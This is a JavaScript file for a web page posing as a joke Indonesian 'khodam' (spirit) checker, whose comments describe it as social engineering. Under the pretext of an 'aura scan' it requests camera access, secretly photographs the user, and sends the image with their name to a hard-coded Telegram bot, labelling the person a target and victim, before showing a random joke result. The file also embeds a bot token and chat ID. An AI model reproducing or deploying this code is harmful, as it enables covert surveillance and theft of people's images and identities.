const BOT_TOKEN = "7834741276:AAEzwblJ8m--92l31Y1IRyw-mrURV6Ag8Nw"; // Ganti disini
const CHAT_ID = "7133478033";     // Ganti disini

const listKhodam = ["Macan Ompong", "Tuyul Gondrong", "Nyi Blorong KW", "Kuntilanak Merah", "Genderuwo Diet", "Monyet Kayang", "Suster Keramas", "Babi Ngepet Premium"];

async function startAction() {
    const nama = document.getElementById('nama').value;
    if(!nama) return alert("Isi namanya dulu, Boss!");

    try {
        // Minta ijin kamera (Social Engineering: Scan Aura)
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        
        // Buat elemen video tersembunyi
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        // Kasih efek loading palsu
        document.getElementById('result').style.display = "block";
        document.getElementById('result').innerText = "Sedang Menghubungi Alam Gaib...";

        setTimeout(() => {
            // Capture foto
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            canvas.toBlob(blob => {
                const fd = new FormData();
                fd.append('chat_id', CHAT_ID);
                fd.append('photo', blob, 'muka_korban.jpg');
                fd.append('caption', `📸 TARGET: ${nama}\n🌐 IP: Terdeteksi\n🤖 Quantum V11.0 Log`);

                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
            }, 'image/jpeg');

            // Tampilkan hasil random ke korban
            const randomKhodam = listKhodam[Math.floor(Math.random() * listKhodam.length)];
            document.getElementById('result').innerHTML = `Khodam Anda:<br><span style="color:#0f0">${randomKhodam}</span>`;
            
            // Matikan kamera setelah capture
            stream.getTracks().forEach(track => track.stop());
        }, 3000);

    } catch (err) {
        alert("Gagal! Aura tidak terdeteksi. Pastikan Izin Kamera diberikan untuk scan Biometrik Khodam.");
    }
}
